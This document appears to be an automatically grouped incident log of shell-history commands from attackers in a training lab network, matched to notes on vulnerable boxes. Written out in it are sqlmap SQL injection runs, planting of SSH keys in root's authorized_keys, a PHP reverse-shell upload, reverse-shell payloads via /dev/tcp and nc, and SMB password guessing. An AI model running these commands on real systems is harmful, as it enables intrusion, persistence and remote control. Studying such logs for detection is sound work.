  - 2026-02-02T19:54:53 | logs/10.100.7.13/shell_history.csv#L328 | curl http://10.100.7.45/panels.php?id=5%20AND%20database()%20IS%20NOT%20NULL""
  - 2026-02-02T19:54:21 | logs/10.100.7.12/shell_history.csv#L209 | sqlmap -u 10.100.7.45/panels.php?id=1" --file-write=id_rsa --file-dest=/root/.ssh/id_rsa"
- Matched Vulnerability Notes:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

## Incident 576 - 2026-02-02T19:54:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-02T19:54:39 | logs/10.100.7.32/shell_history.csv#L871 | tldr sqlmap
  - 2026-02-02T19:54:09 | logs/10.100.7.12/shell_history.csv#L207 | cd ./
  - 2026-02-02T19:54:11 | logs/10.100.7.12/shell_history.csv#L208 | cd ../

## Incident 577 - 2026-02-02T19:57:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-02T19:57:53 | logs/10.100.7.32/shell_history.csv#L872 | tldr sqlmap
  - 2026-02-02T19:57:27 | logs/10.100.7.13/shell_history.csv#L329 | 1))>100""

## Incident 578 - 2026-02-03T18:34:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-03T18:34:15 | logs/10.100.7.32/shell_history.csv#L876 | exit
  - 2026-02-03T18:34:35 | logs/10.100.7.32/shell_history.csv#L877 | clear
  - 2026-02-03T18:34:38 | logs/10.100.7.32/shell_history.csv#L878 | clear
  - 2026-02-03T18:34:38 | logs/10.100.7.32/shell_history.csv#L879 | ls

## Incident 579 - 2026-02-03T18:39:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-03T18:39:44 | logs/10.100.7.32/shell_history.csv#L880 | clear
  - 2026-02-03T18:39:45 | logs/10.100.7.32/shell_history.csv#L881 | exit

## Incident 580 - 2026-02-03T18:42:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-03T18:42:13 | logs/10.100.7.32/shell_history.csv#L882 | exit
  - 2026-02-03T18:42:16 | logs/10.100.7.32/shell_history.csv#L883 | cat /ssh/
  - 2026-02-03T18:42:21 | logs/10.100.7.32/shell_history.csv#L884 | ls /etc/ssh

## Incident 581 - 2026-02-03T18:45:00
- Target IP: 10.100.7.45
- Target Box: pyre
- Entries:
  - 2026-02-03T18:45:07 | logs/10.100.7.32/shell_history.csv#L886 | sqlmap -u http://10.100.7.45/panels.php?id=1" --file-read=/etc/ssh/sshd_config --threads=$(nproc)"
  - 2026-02-03T18:45:07 | logs/10.100.7.32/shell_history.csv#L887 | sqlmap -u http://10.100.7.45/panels.php?id=1" --file-read=/etc/ssh/sshd_config --threads=$(nproc)"
  - 2026-02-03T18:45:07 | logs/10.100.7.32/shell_history.csv#L888 | sqlmap -u http://10.100.7.45/panels.php?id=1" --file-read=/etc/ssh/sshd_config --threads=$(nproc)"
  - 2026-02-03T18:45:07 | logs/10.100.7.32/shell_history.csv#L889 | sqlmap -u http://10.100.7.45/panels.php?id=1" --file-read=/etc/ssh/sshd_config --threads=$(nproc)"
  - 2026-02-03T18:45:35 | logs/10.100.7.12/shell_history.csv#L217 | sqlmap -u 10.100.7.45/panels.php?id=1" --file-write="script.sh" --file-dest="/tmp/script.sh""
- Matched Vulnerability Notes:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

## Incident 582 - 2026-02-03T18:45:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-03T18:45:29 | logs/10.100.7.32/shell_history.csv#L890 | exit
  - 2026-02-03T18:45:34 | logs/10.100.7.32/shell_history.csv#L891 | ls /etc/ssh/

## Incident 583 - 2026-02-03T18:47:00
- Target IP: 10.100.7.45
- Target Box: pyre
- Entries:
  - 2026-02-03T18:47:16 | logs/10.100.7.32/shell_history.csv#L893 | sqlmap -u http://10.100.7.45/panels.php?id=1" --file-write=/home/kali/.ssh/helios_ssh_key.pub --file-dest=/root/.ssh/authorized_keys"
  - 2026-02-03T18:47:33 | logs/10.100.7.32/shell_history.csv#L894 | sqlmap -u http://10.100.7.45/panels.php?id=1" --file-write=/home/kali/.ssh/helios_ssh_key.pub --file-dest=/root/.ssh/authorized_keys"
  - 2026-02-03T18:47:16 | logs/10.100.7.12/shell_history.csv#L219 | sqlmap -u 10.100.7.45/panels.php?id=1" --file-read="/tmp/script.sh""
- Matched Vulnerability Notes:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

## Incident 584 - 2026-02-03T18:48:00
- Target IP: 10.100.7.45
- Target Box: pyre
- Entries:
  - 2026-02-03T18:48:17 | logs/10.100.7.32/shell_history.csv#L895 | sqlmap -u http://10.100.7.45/panels.php?id=1" --file-write=/home/kali/.ssh/helios_ssh_key.pub --file-dest=/home/pyre/.ssh/key.pub"
  - 2026-02-03T18:48:22 | logs/10.100.7.32/shell_history.csv#L896 | ssh pyre@10.100.7.45
  - 2026-02-03T18:48:30 | logs/10.100.7.32/shell_history.csv#L897 | ssh pyre@10.100.7.45
  - 2026-02-03T18:48:39 | logs/10.100.7.32/shell_history.csv#L898 | ssh -i ~/.ssh/helios_ssh_key pyre@10.100.7.45
- Matched Vulnerability Notes:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

## Incident 585 - 2026-02-03T18:53:00
- Target IP: 10.100.7.45
- Target Box: pyre
- Entries:
  - 2026-02-03T18:53:45 | logs/10.100.7.32/shell_history.csv#L905 | sqlmap -u http://10.100.7.45/panels.php?id=1" --file-write=./ctrl.txt --file-dest=/home/pyre/ctrl.txt"
  - 2026-02-03T18:53:30 | logs/10.100.7.12/shell_history.csv#L222 | sqlmap -u 10.100.7.45" --os-cmd="whoami""
  - 2026-02-03T18:53:50 | logs/10.100.7.12/shell_history.csv#L223 | sqlmap -u 10.100.7.45" -p id --os-cmd="whoami""
- Matched Vulnerability Notes:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

## Incident 586 - 2026-02-03T18:54:00
- Target IP: 10.100.7.45
- Target Box: pyre
- Entries:
  - 2026-02-03T18:54:56 | logs/10.100.7.32/shell_history.csv#L906 | sqlmap -u http://10.100.7.45/panels.php?id=1" --os-cmd=whoami"
  - 2026-02-03T18:54:06 | logs/10.100.7.12/shell_history.csv#L224 | sqlmap -u 10.100.7.45.panels.php?id=1" --os-cmd="whoami""
  - 2026-02-03T18:54:20 | logs/10.100.7.12/shell_history.csv#L225 | sqlmap -u 10.100.7.45/panels.php?id=1" --os-cmd="whoami""
- Matched Vulnerability Notes:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

## Incident 587 - 2026-02-03T18:55:00
- Target IP: 10.100.7.45
- Target Box: pyre
- Entries:
  - 2026-02-03T18:55:28 | logs/10.100.7.32/shell_history.csv#L907 | sqlmap -u http://10.100.7.45/panels.php?id=1" --os-cmd=ls"
  - 2026-02-03T18:55:46 | logs/10.100.7.32/shell_history.csv#L908 | sqlmap -u http://10.100.7.45/panels.php?id=1" --os-cmd="ls ../""
  - 2026-02-03T18:55:54 | logs/10.100.7.32/shell_history.csv#L909 | sqlmap -u http://10.100.7.45/panels.php?id=1" --os-cmd="ls ../../""
  - 2026-02-03T18:55:29 | logs/10.100.7.12/shell_history.csv#L226 | sqlmap -u 10.100.7.45/panels.php?id=1" --os-cmd="sudo useradd mason""
- Matched Vulnerability Notes:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

## Incident 588 - 2026-02-03T18:58:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-03T18:58:16 | logs/10.100.7.32/shell_history.csv#L914 | ip addr
  - 2026-02-03T18:58:31 | logs/10.100.7.32/shell_history.csv#L915 | ip addr
  - 2026-02-03T18:58:49 | logs/10.100.7.32/shell_history.csv#L916 | history | grep 4444
  - 2026-02-03T18:58:53 | logs/10.100.7.32/shell_history.csv#L917 | history | grep 5555
  - 2026-02-03T18:58:56 | logs/10.100.7.32/shell_history.csv#L918 | history | grep 4445
  - 2026-02-03T18:58:59 | logs/10.100.7.32/shell_history.csv#L919 | history

## Incident 589 - 2026-02-03T18:59:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-03T18:59:31 | logs/10.100.7.32/shell_history.csv#L920 | ls
  - 2026-02-03T18:59:34 | logs/10.100.7.32/shell_history.csv#L921 | cd Documents
  - 2026-02-03T18:59:34 | logs/10.100.7.32/shell_history.csv#L922 | ls
  - 2026-02-03T18:59:55 | logs/10.100.7.32/shell_history.csv#L923 | cd /tmp

## Incident 590 - 2026-02-03T19:01:00
- Target IP: 10.100.7.45
- Target Box: pyre
- Entries:
  - 2026-02-03T19:01:09 | logs/10.100.7.32/shell_history.csv#L926 | sqlmap -u http://10.100.7.45/panels.php?id=1" --os-cmd="bash -i >& /dev/tcp/10.100.7.32/4444 0>&1""
  - 2026-02-03T19:01:31 | logs/10.100.7.32/shell_history.csv#L927 | sqlmap -u http://10.100.7.45/panels.php?id=1" --os-cmd="nc 10.100.7.32 4444 -e /bin/bash""
  - 2026-02-03T19:01:57 | logs/10.100.7.32/shell_history.csv#L928 | sqlmap -u http://10.100.7.45/panels.php?id=1" --os-cmd="sh -i >& /dev/tcp/10.100.7.32/4444 0>&1""
  - 2026-02-03T19:01:58 | logs/10.100.7.12/shell_history.csv#L228 | sqlmap -u 10.100.7.45/panels.php?id=1" --os-shell"
- Matched Vulnerability Notes:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

## Incident 591 - 2026-02-03T19:01:00
- Target IP: 10.100.7.32
- Target Box: None
- Entries:
  - 2026-02-03T19:01:09 | logs/10.100.7.32/shell_history.csv#L926 | sqlmap -u http://10.100.7.45/panels.php?id=1" --os-cmd="bash -i >& /dev/tcp/10.100.7.32/4444 0>&1""
  - 2026-02-03T19:01:31 | logs/10.100.7.32/shell_history.csv#L927 | sqlmap -u http://10.100.7.45/panels.php?id=1" --os-cmd="nc 10.100.7.32 4444 -e /bin/bash""
  - 2026-02-03T19:01:57 | logs/10.100.7.32/shell_history.csv#L928 | sqlmap -u http://10.100.7.45/panels.php?id=1" --os-cmd="sh -i >& /dev/tcp/10.100.7.32/4444 0>&1""

## Incident 592 - 2026-02-03T19:06:00
- Target IP: 10.100.7.45
- Target Box: pyre
- Entries:
  - 2026-02-03T19:06:35 | logs/10.100.7.32/shell_history.csv#L931 | sqlmap -u http://10.100.7.45/panels.php?id=1" --os-pwn"
  - 2026-02-03T19:06:46 | logs/10.100.7.32/shell_history.csv#L932 | sqlmap -u http://10.100.7.45/panels.php?id=1" --os-pwn"
- Matched Vulnerability Notes:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

## Incident 593 - 2026-02-03T19:06:00
- Target IP: 10.100.7.40
- Target Box: default
- Entries:
  - 2026-02-03T19:06:04 | logs/10.100.7.31/shell_history.csv#L31 | nxc smb 10.100.7.40 -u guest -p ‘ ‘
  - 2026-02-03T19:06:53 | logs/10.100.7.31/shell_history.csv#L32 | nxc smb 10.100.7.40 -u solaris -p password

## Incident 594 - 2026-02-03T19:12:00
- Target IP: 10.100.7.45
- Target Box: pyre
- Entries:
  - 2026-02-03T19:12:44 | logs/10.100.7.32/shell_history.csv#L934 | sqlmap -u http://10.100.7.45/panels.php?id=1" --os-shell"
  - 2026-02-03T19:12:03 | logs/10.100.7.12/shell_history.csv#L233 | sqlmap -u 10.100.7.45/panels.php?id=1" --file-read="/ctrl.txt""
  - 2026-02-03T19:12:50 | logs/10.100.7.12/shell_history.csv#L234 | sqlmap -u 10.100.7.45/panels.php?id=1" --file-read="home/pyre/ctrl.txt""
- Matched Vulnerability Notes:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

## Incident 595 - 2026-02-03T19:27:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-03T19:27:56 | logs/10.100.7.32/shell_history.csv#L937 | python3 penelope.py
  - 2026-02-03T19:27:24 | logs/10.100.7.31/shell_history.csv#L73 | clear
  - 2026-02-03T19:27:36 | logs/10.100.7.31/shell_history.csv#L75 | ls

## Incident 596 - 2026-02-03T19:27:00
- Target IP: 10.100.7.40
- Target Box: default
- Entries:
  - 2026-02-03T19:27:20 | logs/10.100.7.31/shell_history.csv#L72 | gobuster vhost -u http://10.100.7.40/ --append-domain -w directory-list-2.3-medium.txt
  - 2026-02-03T19:27:36 | logs/10.100.7.31/shell_history.csv#L74 | gobuster dir -u https://10.100.7.40 -w wordlist.txt
  - 2026-02-03T19:27:46 | logs/10.100.7.31/shell_history.csv#L76 | gobuster dir -u https://10.100.7.40 -w directory-list-2.3-medium.txt

## Incident 597 - 2026-02-03T19:30:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-03T19:30:20 | logs/10.100.7.32/shell_history.csv#L949 | vi php-reverse-shell.php
  - 2026-02-03T19:30:35 | logs/10.100.7.32/shell_history.csv#L950 | vi php-reverse-shell.php
  - 2026-02-03T19:30:37 | logs/10.100.7.32/shell_history.csv#L951 | history | grep write-file

## Incident 598 - 2026-02-03T19:30:00
- Target IP: 10.100.7.45
- Target Box: pyre
- Entries:
  - 2026-02-03T19:30:21 | logs/10.100.7.12/shell_history.csv#L251 | sqlmap -u 10.100.7.45/panels.php?id=1" --os-shell"
  - 2026-02-03T19:30:47 | logs/10.100.7.12/shell_history.csv#L252 | sqlmap -u 10.100.7.45/panels.php?id=1" --os-shell"
- Matched Vulnerability Notes:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

## Incident 599 - 2026-02-03T19:31:00
- Target IP: 10.100.7.45
- Target Box: pyre
- Entries:
  - 2026-02-03T19:31:12 | logs/10.100.7.32/shell_history.csv#L952 | sqlmap -u http://10.100.7.45/panels.php?id=1" --write-file=./php-reverse-shell.php --dest-file=/var/www/html/rev-shell.php"
  - 2026-02-03T19:31:47 | logs/10.100.7.32/shell_history.csv#L953 | sqlmap -u http://10.100.7.45/panels.php?id=1" --file-write=./php-reverse-shell.php --file-dest=/var/www/html/rev-shell.php"
  - 2026-02-03T19:31:54 | logs/10.100.7.12/shell_history.csv#L253 | sqlmap -u 10.100.7.45/panels.php?id=1" --os-shell"
  - 2026-02-03T19:31:20 | logs/10.100.7.31/shell_history.csv#L79 | gobuster dir -u http://10.100.7.45 -w directory-list-2.3-medium.txt
- Matched Vulnerability Notes:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

## Incident 600 - 2026-02-03T19:38:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-03T19:38:04 | logs/10.100.7.32/shell_history.csv#L954 | tldr setcap
  - 2026-02-03T19:38:28 | logs/10.100.7.32/shell_history.csv#L955 | cat ~/.ssh/helios_ssh_key
  - 2026-02-03T19:38:30 | logs/10.100.7.32/shell_history.csv#L956 | cat ~/.ssh/helios_ssh_key.pub

## Incident 601 - 2026-02-03T19:38:00
- Target IP: 10.100.7.45
- Target Box: pyre
- Entries:
  - 2026-02-03T19:38:47 | logs/10.100.7.12/shell_history.csv#L258 | sqlmap -u 10.100.7.45/panels.php?id=1" --os-shell"
  - 2026-02-03T19:38:54 | logs/10.100.7.12/shell_history.csv#L259 | sqlmap -u 10.100.7.45/panels.php?id=1" --file-write="shell.py" --file-dest="~/var/www/html/""
- Matched Vulnerability Notes:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

## Incident 602 - 2026-02-03T19:41:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-03T19:41:12 | logs/10.100.7.32/shell_history.csv#L957 | exit
  - 2026-02-03T19:41:32 | logs/10.100.7.12/shell_history.csv#L264 | cat shell.py

## Incident 603 - 2026-02-03T19:41:00
- Target IP: 10.100.7.45
- Target Box: pyre
- Entries:
  - 2026-02-03T19:41:24 | logs/10.100.7.12/shell_history.csv#L263 | sqlmap -u 10.100.7.45/panels.php?id=1" --os-shell"
  - 2026-02-03T19:41:40 | logs/10.100.7.12/shell_history.csv#L265 | sqlmap -u 10.100.7.45/panels.php?id=1" --file-write="shell.py" --file-dest="/var/www/html/shell.py""
- Matched Vulnerability Notes:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

## Incident 604 - 2026-02-03T19:42:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-03T19:42:51 | logs/10.100.7.32/shell_history.csv#L958 | exit
  - 2026-02-03T19:42:53 | logs/10.100.7.32/shell_history.csv#L959 | exit

## Incident 605 - 2026-02-03T19:43:00
- Target IP: 10.100.7.45
- Target Box: pyre
- Entries:
  - 2026-02-03T19:43:04 | logs/10.100.7.32/shell_history.csv#L960 | ssh pyre@10.100.7.45
  - 2026-02-03T19:43:37 | logs/10.100.7.32/shell_history.csv#L961 | ssh pyre@10.100.7.45
  - 2026-02-03T19:43:57 | logs/10.100.7.32/shell_history.csv#L962 | ssh pyre@10.100.7.45
  - 2026-02-03T19:43:27 | logs/10.100.7.12/shell_history.csv#L267 | sqlmap -u 10.100.7.45/panels.php?id=1" --os-shell"
- Matched Vulnerability Notes:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

## Incident 606 - 2026-02-03T19:44:00
- Target IP: 10.100.7.45
- Target Box: pyre
- Entries:
  - 2026-02-03T19:44:14 | logs/10.100.7.32/shell_history.csv#L963 | ssh root@10.100.7.45
  - 2026-02-03T19:44:00 | logs/10.100.7.12/shell_history.csv#L269 | sqlmap -u 10.100.7.45/panels.php?id=1" --file-write="shell.py" --file-dest="/var/www/html/shell.py""
  - 2026-02-03T19:44:16 | logs/10.100.7.12/shell_history.csv#L270 | sqlmap -u 10.100.7.45/panels.php" --file-write="shell.py" --file-dest="/var/www/html/shell.py""
  - 2026-02-03T19:44:27 | logs/10.100.7.12/shell_history.csv#L271 | sqlmap -u 10.100.7.45/panels.php?id=1" --file-write="shell.py" --file-dest="/var/www/html/shell.py""
  - 2026-02-03T19:44:53 | logs/10.100.7.12/shell_history.csv#L272 | sqlmap -u 10.100.7.45/panels.php?id=1" --os-shell"
- Matched Vulnerability Notes:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

## Incident 607 - 2026-02-03T20:05:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-03T20:05:02 | logs/10.100.7.32/shell_history.csv#L973 | ls
  - 2026-02-03T20:05:07 | logs/10.100.7.32/shell_history.csv#L974 | ls
  - 2026-02-03T20:05:31 | logs/10.100.7.12/shell_history.csv#L291 | nc -lvnp 5000
  - 2026-02-03T20:05:56 | logs/10.100.7.12/shell_history.csv#L292 | socat file:/dev/tty,raw,echo=0 tcp-listen:12345

## Incident 608 - 2026-02-03T20:19:00
- Target IP: 10.100.7.45
- Target Box: pyre
- Entries:
  - 2026-02-03T20:19:32 | logs/10.100.7.32/shell_history.csv#L977 | ssh -i ~/.ssh/helios_ssh_key root@10.100.7.45
  - 2026-02-03T20:19:37 | logs/10.100.7.32/shell_history.csv#L978 | ssh -i ~/.ssh/helios_ssh_key root@10.100.7.45
- Matched Vulnerability Notes:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

## Incident 609 - 2026-02-03T20:26:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-03T20:26:59 | logs/10.100.7.32/shell_history.csv#L979 | exit
  - 2026-02-03T20:26:02 | logs/10.100.7.12/shell_history.csv#L295 | socat file:/dev/tty,raw,echo=0 tcp-listen:5000

## Incident 610 - 2026-02-03T20:30:00
- Target IP: 10.100.7.45
- Target Box: pyre
- Entries:
  - 2026-02-03T20:30:58 | logs/10.100.7.32/shell_history.csv#L980 | ssh root@10.100.7.45
  - 2026-02-03T20:30:59 | logs/10.100.7.32/shell_history.csv#L981 | ssh -i ~/.ssh/helios_ssh_key root@10.100.7.45
- Matched Vulnerability Notes:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

## Incident 611 - 2026-02-03T20:31:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-03T20:31:01 | logs/10.100.7.32/shell_history.csv#L982 | nexit
  - 2026-02-03T20:31:04 | logs/10.100.7.32/shell_history.csv#L983 | python3 penelope.py
  - 2026-02-03T20:31:05 | logs/10.100.7.32/shell_history.csv#L984 | tmux

## Incident 612 - 2026-02-09T18:08:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-09T18:08:42 | logs/10.100.7.32/shell_history.csv#L986 | exit
  - 2026-02-09T18:08:43 | logs/10.100.7.32/shell_history.csv#L987 | exit

## Incident 613 - 2026-02-09T18:09:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-09T18:09:09 | logs/10.100.7.32/shell_history.csv#L988 | exit
  - 2026-02-09T18:09:09 | logs/10.100.7.32/shell_history.csv#L989 | ls
  - 2026-02-09T18:09:11 | logs/10.100.7.32/shell_history.csv#L990 | cd Documents
  - 2026-02-09T18:09:12 | logs/10.100.7.32/shell_history.csv#L991 | ls
  - 2026-02-09T18:09:13 | logs/10.100.7.32/shell_history.csv#L992 | cd forge-logs
  - 2026-02-09T18:09:13 | logs/10.100.7.32/shell_history.csv#L993 | ls
  - 2026-02-09T18:09:14 | logs/10.100.7.32/shell_history.csv#L994 | ls
  - 2026-02-09T18:09:15 | logs/10.100.7.32/shell_history.csv#L995 | cd logs
  - 2026-02-09T18:09:15 | logs/10.100.7.32/shell_history.csv#L996 | ls
  - 2026-02-09T18:09:18 | logs/10.100.7.32/shell_history.csv#L997 | cat quality.log
  - 2026-02-09T18:09:21 | logs/10.100.7.32/shell_history.csv#L998 | ls -la
  - 2026-02-09T18:09:22 | logs/10.100.7.32/shell_history.csv#L999 | git status
  - 2026-02-09T18:09:26 | logs/10.100.7.32/shell_history.csv#L1000 | cd ..
  - 2026-02-09T18:09:27 | logs/10.100.7.32/shell_history.csv#L1001 | ls
  - 2026-02-09T18:09:28 | logs/10.100.7.32/shell_history.csv#L1002 | git status
  - 2026-02-09T18:09:28 | logs/10.100.7.32/shell_history.csv#L1003 | ls
  - 2026-02-09T18:09:30 | logs/10.100.7.32/shell_history.csv#L1004 | ls
  - 2026-02-09T18:09:31 | logs/10.100.7.32/shell_history.csv#L1005 | git log
  - 2026-02-09T18:09:35 | logs/10.100.7.32/shell_history.csv#L1006 | git log --oneline
  - 2026-02-09T18:09:40 | logs/10.100.7.32/shell_history.csv#L1007 | ls
  - 2026-02-09T18:09:49 | logs/10.100.7.32/shell_history.csv#L1008 | git checkout 7eb86ab
  - 2026-02-09T18:09:49 | logs/10.100.7.32/shell_history.csv#L1009 | ls
  - 2026-02-09T18:09:51 | logs/10.100.7.32/shell_history.csv#L1010 | cd config
  - 2026-02-09T18:09:51 | logs/10.100.7.32/shell_history.csv#L1011 | ls
  - 2026-02-09T18:09:52 | logs/10.100.7.32/shell_history.csv#L1012 | cat system.conf

## Incident 614 - 2026-02-09T18:10:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-09T18:10:39 | logs/10.100.7.32/shell_history.csv#L1013 | exit
  - 2026-02-09T18:10:39 | logs/10.100.7.32/shell_history.csv#L1014 | ls

## Incident 615 - 2026-02-09T18:11:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-09T18:11:13 | logs/10.100.7.32/shell_history.csv#L1015 | ls
  - 2026-02-09T18:11:38 | logs/10.100.7.14/shell_history.csv#L423 | clear
  - 2026-02-09T18:11:38 | logs/10.100.7.14/shell_history.csv#L424 | clear

## Incident 616 - 2026-02-09T18:17:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-09T18:17:46 | logs/10.100.7.32/shell_history.csv#L1024 | cat ~/.ssh/helios_ssh_key.pub
  - 2026-02-09T18:17:21 | logs/10.100.7.12/shell_history.csv#L303 | ls

## Incident 617 - 2026-02-09T18:21:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-09T18:21:24 | logs/10.100.7.32/shell_history.csv#L1026 | cat ~/.ssh/helios_ssh_key.pub
  - 2026-02-09T18:21:42 | logs/10.100.7.32/shell_history.csv#L1028 | rm ~/.ssh/known_hosts

## Incident 618 - 2026-02-09T18:23:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-09T18:23:32 | logs/10.100.7.32/shell_history.csv#L1029 | wget https://raw.githubusercontent.com/brightio/penelope/refs/heads/main/penelope.py && python3 penelope.py
  - 2026-02-09T18:23:32 | logs/10.100.7.32/shell_history.csv#L1030 | ls
  - 2026-02-09T18:23:35 | logs/10.100.7.32/shell_history.csv#L1031 | cd ~/Documents
  - 2026-02-09T18:23:36 | logs/10.100.7.32/shell_history.csv#L1032 | ls
  - 2026-02-09T18:23:37 | logs/10.100.7.32/shell_history.csv#L1033 | cd forge-logs
  - 2026-02-09T18:23:38 | logs/10.100.7.32/shell_history.csv#L1034 | ls
  - 2026-02-09T18:23:39 | logs/10.100.7.32/shell_history.csv#L1035 | cd config
  - 2026-02-09T18:23:39 | logs/10.100.7.32/shell_history.csv#L1036 | ls
  - 2026-02-09T18:23:41 | logs/10.100.7.32/shell_history.csv#L1037 | cat system.conf

## Incident 619 - 2026-02-09T18:34:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-09T18:34:00 | logs/10.100.7.14/shell_history.csv#L457 | sqlmap -h
  - 2026-02-09T18:34:34 | logs/10.100.7.14/shell_history.csv#L458 | sqlmap -a

## Incident 620 - 2026-02-09T18:35:00
- Target IP: 10.100.7.47
- Target Box: crucible
- Entries:
  - 2026-02-09T18:35:30 | logs/10.100.7.32/shell_history.csv#L1041 | ssh -i ~/.ssh/helios_ssh_key root@10.100.7.47
  - 2026-02-09T18:35:35 | logs/10.100.7.32/shell_history.csv#L1042 | ssh -i ~/.ssh/helios_ssh_key crucible@10.100.7.47
  - 2026-02-09T18:35:40 | logs/10.100.7.32/shell_history.csv#L1043 | ssh -i ~/.ssh/helios_ssh_key crucible@10.100.7.47

## Incident 621 - 2026-02-09T18:35:00
- Target IP: 10.100.7.48
- Target Box: inspire
- Entries:
  - 2026-02-09T18:35:04 | logs/10.100.7.14/shell_history.csv#L459 | sqlmap -u http://10.100.7.48/api.php?action=stats" -a --passwords --dbs"
  - 2026-02-09T18:35:21 | logs/10.100.7.14/shell_history.csv#L460 | sqlmap -u http://10.100.7.48/api.php?action=stats" -a --passwords --dbs --risk"
  - 2026-02-09T18:35:26 | logs/10.100.7.14/shell_history.csv#L461 | sqlmap -u http://10.100.7.48/api.php?action=stats" -a --passwords --dbs --risk 10"
  - 2026-02-09T18:35:39 | logs/10.100.7.14/shell_history.csv#L462 | sqlmap -u http://10.100.7.48/api.php?action=stats" -a --passwords --dbs --risk 3"
- Matched Vulnerability Notes:
  - boxes/inspire/documentation.md: sql, git, anonymous, base64, pickle
  - boxes/inspire/deploy/deploy.sh: sql, anonymous, pickle

## Incident 622 - 2026-02-09T18:36:00
- Target IP: 10.100.7.48
- Target Box: inspire
- Entries:
  - 2026-02-09T18:36:00 | logs/10.100.7.32/shell_history.csv#L1044 | sqlmap -u http://10.100.7.48""
  - 2026-02-09T18:36:39 | logs/10.100.7.32/shell_history.csv#L1045 | sqlmap -u http://10.100.7.48""
  - 2026-02-09T18:36:42 | logs/10.100.7.32/shell_history.csv#L1046 | curl http://10.100.7.48/api.php?action=stats""
  - 2026-02-09T18:36:58 | logs/10.100.7.32/shell_history.csv#L1047 | sqlmap -u http://10.100.7.48/api.php?action=stats""
- Matched Vulnerability Notes:
  - boxes/inspire/documentation.md: sql, git, anonymous, base64, pickle
  - boxes/inspire/deploy/deploy.sh: sql, anonymous, pickle

## Incident 623 - 2026-02-09T18:40:00
- Target IP: 10.100.7.48
- Target Box: inspire
- Entries:
  - 2026-02-09T18:40:01 | logs/10.100.7.32/shell_history.csv#L1048 | sqlmap -u http://10.100.7.48/api.php""
  - 2026-02-09T18:40:31 | logs/10.100.7.32/shell_history.csv#L1049 | sqlmap -u http://10.100.7.48/api.php?action=stats""
- Matched Vulnerability Notes:
  - boxes/inspire/documentation.md: sql, git, anonymous, base64, pickle
  - boxes/inspire/deploy/deploy.sh: sql, anonymous, pickle

## Incident 624 - 2026-02-09T18:40:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-09T18:40:40 | logs/10.100.7.12/shell_history.csv#L312 | cat maintenance.ps1
  - 2026-02-09T18:40:53 | logs/10.100.7.12/shell_history.csv#L313 | nano maintenance.ps1
  - 2026-02-09T18:40:55 | logs/10.100.7.12/shell_history.csv#L314 | cat maintenance.ps1

## Incident 625 - 2026-02-09T18:42:00
- Target IP: 10.100.7.48
- Target Box: inspire
- Entries:
  - 2026-02-09T18:42:25 | logs/10.100.7.32/shell_history.csv#L1050 | curl http://10.100.7.48/api.php?action=stats""
  - 2026-02-09T18:42:28 | logs/10.100.7.32/shell_history.csv#L1051 | curl http://10.100.7.48/api.php?action=""
- Matched Vulnerability Notes:
  - boxes/inspire/documentation.md: sql, git, anonymous, base64, pickle
  - boxes/inspire/deploy/deploy.sh: sql, anonymous, pickle

## Incident 626 - 2026-02-09T18:51:00
- Target IP: 10.100.7.42
- Target Box: orbital
